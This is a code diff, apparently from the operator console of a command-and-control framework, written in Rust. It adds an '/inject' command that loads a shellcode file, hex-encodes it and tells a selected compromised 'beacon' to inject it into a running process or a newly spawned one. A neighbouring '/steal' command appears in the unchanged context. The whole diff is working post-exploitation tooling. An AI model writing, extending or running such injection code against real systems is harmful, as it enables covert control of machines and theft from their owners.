@@ -1126,6 +1126,39 @@ ParsedTable::Audit(rows) => {
                 };
                 self.send(Cmd::GetUid { session: s.id });
             }
+            "/inject" => {
+                let Some(s) = self.current_session().cloned() else {
+                    self.log("! select a beacon first", Level::Err); return;
+                };
+                // /inject <method> <pid|spawn_to> <file.bin>
+                let mut parts = args.split_whitespace();
+                let method: u8 = match parts.next().and_then(|m| m.parse().ok()) {
+                    Some(v) => v,
+                    None => { self.log("usage: /inject <method 0|1|2> <pid|spawn_to> <file>", Level::Warn); return; }
+                };
+                let target = parts.next().unwrap_or("").to_string();
+                let file = match parts.next() {
+                    Some(f) => f.to_string(),
+                    None => { self.log("usage: /inject <method> <pid|spawn_to> <file>", Level::Warn); return; }
+                };
+                let data = match std::fs::read(&file) {
+                    Ok(d) => d,
+                    Err(e) => { self.log(&format!("! read {file}: {e}"), Level::Err); return; }
+                };
+                // Parse target: if numeric, it's a pid; otherwise spawn_to name.
+                let (pid, spawn_to) = match target.parse::<u32>() {
+                    Ok(p) => (p, String::new()),
+                    Err(_) => (0, target),
+                };
+                let sc_hex = hex::encode(&data);
+                self.send(Cmd::Inject {
+                    session: s.id,
+                    method,
+                    pid,
+                    spawn_to,
+                    sc_hex,
+                });
+            }
             "/steal" => {
                 let Some(s) = self.current_session().cloned() else {
                     self.log("! select a beacon first", Level::Err); return;
